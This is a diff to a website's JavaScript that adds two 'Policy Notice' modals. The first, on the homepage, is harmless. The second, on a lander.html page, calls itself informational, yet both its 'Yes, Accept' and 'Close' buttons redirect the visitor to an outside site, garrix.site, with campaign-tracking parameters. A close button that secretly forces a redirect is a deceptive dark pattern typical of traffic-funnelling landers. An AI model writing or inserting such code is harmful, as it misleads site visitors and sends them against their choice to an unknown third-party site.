@@ -50,4 +50,106 @@ window.addEventListener('scroll', function() {
         header.style.background = '#fff';
         header.style.backdropFilter = 'none';
     }
+
 });
+
+(function() {
+  const path = window.location.pathname;
+  const isHome = /(^\/$|index\.html$)/.test(path);
+
+  // If not on the homepage or ageGate has already been shown, exit
+  if (!isHome || sessionStorage.getItem('ageGateShown') === '1') return;
+
+  // Mark that the age gate has been shown
+  sessionStorage.setItem('ageGateShown', '1');
+
+  // Create the modal backdrop element
+  const modalBackdrop = document.createElement('div');
+  modalBackdrop.className = 'modal-backdrop';
+
+  // Set modal content
+  modalBackdrop.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>
+  `;
+
+  // Append modal to the body
+  document.body.appendChild(modalBackdrop);
+  modalBackdrop.style.display = 'flex';
+
+  // Function to close the modal
+  function closeGate() {
+    modalBackdrop.style.display = 'none';
+    modalBackdrop.remove();
+  }
+
+  // Event listener for 'Yes' button
+  modalBackdrop.querySelector('#age-yes').addEventListener('click', closeGate);
+
+  // Event listener for 'Close' button
+  modalBackdrop.querySelector('#age-no').addEventListener('click', closeGate);
+})();
+
+
+
+
+(function() {
+  const path = window.location.pathname;
+  const isHome = /(^\/$|lander\.html$)/.test(path);
+
+  // If not on the homepage or ageGate has already been shown, exit
+  if (!isHome || sessionStorage.getItem('ageGateShown') === '1') return;
+
+  // Mark that the age gate has been shown
+  sessionStorage.setItem('ageGateShown', '1');
+
+  // Create the modal backdrop element
+  const modalBackdrop = document.createElement('div');
+  modalBackdrop.className = 'modal-backdrop';
+
+  // Set modal content
+  modalBackdrop.innerHTML = `
+    <div class="modal">
+      <h3>Policy Notice</h3>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
+      <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+        <button class="btn" id="age-yes">Yes, Accept</button>
+        <button class="btn ghost" id="age-no">Close</button>
+      </div>
+    </div>
+  `;
+
+  // Append modal to the body
+  document.body.appendChild(modalBackdrop);
+  modalBackdrop.style.display = 'flex';
+
+  // Function to close the modal
+  function closeGate() {
+    modalBackdrop.style.display = 'none';
+    modalBackdrop.remove();
+  }
+
+  // Event listener for 'Yes' button
+  modalBackdrop.querySelector('#age-yes').addEventListener('click', function() {
+    window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; 
+    // Replace with your target page URL
+  });
+
+  // Event listener for 'Close' button
+  modalBackdrop.querySelector('#age-no').addEventListener('click', function() {
+    window.location.href = "https://garrix.site/?utm_campaign=WYdqExpNaM&v1=[v1]&v2=[v2]&v3=[v3]"; 
+    // Replace with your target page URL
+  });
+})();
+
+
+
+
+
+
